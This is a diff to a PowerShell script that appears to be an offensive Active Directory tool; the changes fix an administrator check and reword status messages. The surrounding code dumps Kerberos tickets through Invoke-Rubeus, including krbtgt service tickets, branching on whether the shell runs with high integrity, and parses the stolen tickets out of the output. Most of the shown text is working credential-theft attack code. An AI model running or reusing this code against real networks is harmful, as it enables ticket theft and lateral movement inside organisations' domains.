@@ -271,7 +271,7 @@ $UserFiles = Join-Path "$PME" "User Files"
 }
 
 ######### Checks if user context is administrative when a session is spawned #########
-$CheckAdmin = "([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
+$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 ######### Target acquisition  Single Domain #########
 
@@ -518,11 +518,13 @@ IF ($Method -ne "RDP") {
 Catch {
 
 try{
-Write-Host "Attempting alternate method for ticket retrieval" -ForegroundColor "Yellow"
+ Write-Host "[*] " -ForegroundColor "Yellow"   -NoNewline
+ Write-Host "Ticket retrieval failed. Trying alternative methods"
  
  IF (!$CheckAdmin){
 
- Write-Host "Shell is not high integrity" -ForegroundColor "Yellow"
+ Write-Host "[*] " -ForegroundColor "Yellow"   -NoNewline
+ Write-Host "We are NOT a high integrity shell"
  $Ticket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
  $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
     
@@ -530,7 +532,8 @@ Write-Host "Attempting alternate method for ticket retrieval" -ForegroundColor "
 
 IF ($CheckAdmin){
  
- Write-Host "Shell is high integrity" -ForegroundColor "Yellow"
+ Write-Host "[*] " -ForegroundColor "Yellow"   -NoNewline
+ Write-Host "We are in a high integrity shell"
  $Ticket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
  $OriginalUserTicket = ($Ticket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
         }
